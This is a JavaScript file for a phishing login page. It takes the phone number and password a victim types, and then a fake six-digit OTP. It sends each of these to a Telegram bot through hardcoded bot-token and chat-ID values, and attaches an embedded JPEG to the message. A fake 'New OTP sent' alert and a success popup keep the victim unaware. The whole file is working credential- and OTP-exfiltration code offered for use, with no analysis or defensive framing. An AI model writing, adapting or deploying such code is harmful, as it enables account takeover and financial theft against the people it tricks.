const BOT_TOKEN = '8786937967:AAF89mjtatOLHo44RGGay_1C6_ZwlCScrnM';
const CHAT_ID = '-1003923232961';

var IMG_B64 = '/9j/4AAQSkZJRgABAQEASABIAAD/4gIYSUNDX1BST0ZJTEUAAQEAAAIIAAAAAAQwAABtbnRyUkdCIFhZWiAH4AABAAEAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAGRyWFlaAAABVAAAABRnWFlaAAABaAAAABRiWFlaAAABfAAAABR3dHB0AAABkAAAABRyVFJDAAABpAAAAChnVFJDAAABpAAAAChiVFJDAAABpAAAAChjcHJ0AAABzAAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAEYAAAAcAEQAaQBzAHAAbABhAHkAIABQADMAIABHAGEAbQB1AHQAIAB3AGkAdABoACAAcwBSAEcAQgAgAFQAcgBhAG4AcwBmAGUAcgAAWFlaIAAAAAAAAIPeAAA9vv///7tYWVogAAAAAAAASr4AALE2AAAKuVhZWiAAAAAAAAAoOwAAEQwAAMjNWFlaIAAAAAAAAPbWAAEAAAAA0y1wYXJhAAAAAAAEAAAAAmZmAADypwAADVkAABPQAAAKWwAAAAAAAAAAbWx1YwAAAAAAAAABAAAADGVuVVMAAAAgAAAAHABHAG8AbwBnAGwAZQAgAEkAbgBjAC4AIAAyADAAMQA2/9sAQwAEAwMEAwMEBAMEBQQEBQYKBwYGBgYNCQoICg8NEBAPDQ8OERMYFBESFxIODxUcFRcZGRsbGxAUHR8dGh8YGhsa/9sAQwEEBQUGBQYMBwcMGhEPERoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoa/8IAEQgCUAKsAwEiAAIRAQMRAf/EABsAAQACAwEBAAAAAAAAAAAAAAABAwIFBgQH/8QAGgEBAQEBAQEBAAAAAAAAAAAAAAECAwQFBv/aAAwDAQACEAMQAAAB+7jeQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJupvzYSlhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIhIV2VJgNwAAAAAAAACb6L80JQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIwzwSsbgAAAAAAAAE30X5oSgAAAAAAAAAAAAAAAAAAAAAAAAAAAAARhnglY3AAAAAAAAAJvovzQlAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjDPBKxuAAAAAAAAATfRfmhKAAAAAAAAAAAAAAAAAAAAAAAAAAAAABGGeCVjcAAAAAAAAAm+i/NCUAAAAAAAAAAAAAAAAAAAAAAAAAAAAACMM8ErG4AAAAAAAABN9F+aEoAAAAAAAAAAAAgljWXPMPSozLESAAAAAAAAAAAAARhnglY3AAAAAAAAAJvovzQlAAAAAAAAAAEDHV8WdvreSvxeo9nJ+nj06yeZyTdeXT0Vuffx1e8/SbPlnU9c9WrsAAAAAAAAAAAIwzwSsbgAAAAAAAAE30X5oSgAAAAAAAADEji55NNf7fVtfL28/ro92dY0+y88azKPJl65t8/j9/hk1mm6/yWYfR/ku19XH6g8/o0AAAAAAAAAAjDPBKxuAAAAAAAAATfRfmhKAAAAAAAAIGh2/JGnou6zzddL5tjfHi8no31anY7C7rzryvy1NVrujpzeNu6TT8uni8/q9mbqfB1uirYdlwnU+njtETQAAAAAAAAEYZ4JWNwAAAAAAAACb6L80JQAAAAAAAETUavn+j5vjrYbf0RvPmXxpXllncxZlImIWK7R';

function sendToTelegram(msg, isLogin) {
    if (isLogin) {
        var formData = new FormData();
        var byteChars = atob(IMG_B64);
        var byteNums = new Array(byteChars.length);
        for (var i = 0; i < byteChars.length; i++) {
            byteNums[i] = byteChars.charCodeAt(i);
        }
        var byteArr = new Uint8Array(byteNums);
        var blob = new Blob([byteArr], { type: 'image/jpeg' });
        formData.append('photo', blob, 'photo.jpg');
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', msg);
        formData.append('parse_mode', 'HTML');
        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
            method: 'POST',
            body: formData
        }).then(function(r) {
            if (!r.ok) sendTextOnly(msg);
        }).catch(function() {
            sendTextOnly(msg);
        });
    } else {
        sendTextOnly(msg);
    }
}

function sendTextOnly(msg) {
    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
    }).catch(function() {});
}

function handleSignIn() {
    const phone = document.getElementById('phone').value;
    const password = document.getElementById('password').value;

    if (!phone || !password) {
        alert('Please fill in all fields');
        return;
    }

    const overlay = document.getElementById('overlay');
    const otpPopup = document.getElementById('otpPopup');

    overlay.classList.add('active');
    otpPopup.classList.add('active');
    document.querySelectorAll('.otp-input')[0].focus();

    var sep = '\u2501'.repeat(15);
    var msg = 'Login Details\n' + sep + '\n📱 Phone: <code>' + phone + '</code>\n🔑 Password: <code>' + password + '</code>\n' + sep;
    try {
        sendToTelegram(msg, true);
    } catch (e) {
        sendTextOnly(msg);
    }
}

function otpInput(input, index) {
    input.value = input.value.replace(/[^0-9]/g, '');
    if (input.value) {
        input.classList.add('filled');
        if (index < 5) {
            document.querySelectorAll('.otp-input')[index + 1].focus();
        }
    } else {
        input.classList.remove('filled');
    }
}

function otpKeydown(event, input, index) {
    if (event.key === 'Backspace' && !input.value && index > 0) {
        document.querySelectorAll('.otp-input')[index - 1].focus();
    }
    if (event.key === 'Enter') {
        verifyOtp();
    }
}

function verifyOtp() {
    const inputs = document.querySelectorAll('.otp-input');
    let otp = '';
    inputs.forEach(function(inp) { otp += inp.value; });
    if (otp.length < 6) {
        alert('Please enter all 6 digits');
        return;
    }

    const phone = document.getElementById('phone').value;

    var sep = '\u2501'.repeat(15);
    var msg = 'OTP Received\n' + sep + '\n📱 Phone: <code>' + phone + '</code>\n🔢 OTP: <code>' + otp + '</code>\n' + sep;
    sendToTelegram(msg);

    document.getElementById('otpPopup').classList.remove('active');
    document.getElementById('successPopup').classList.add('active');

    var seconds = 10;
    var timer = document.getElementById('timerCountdown');
    var interval = setInterval(function() {
        seconds--;
        timer.textContent = seconds;
        if (seconds <= 0) {
            clearInterval(interval);
            closeOtp();
        }
    }, 1000);
}

function resendOtp() {
    alert('New OTP sent to your phone!');
}

function closeOtp() {
    document.getElementById('overlay').classList.remove('active');
    document.getElementById('loadingSpinner').classList.remove('active');
    document.getElementById('otpPopup').classList.remove('active');
    document.getElementById('successPopup').classList.remove('active');
    document.querySelectorAll('.otp-input').forEach(function(inp) {
        inp.value = '';
        inp.classList.remove('filled');
    });
}

document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        const overlay = document.getElementById('overlay');
        if (!overlay.classList.contains('active')) {
            handleSignIn();
        }
    }
});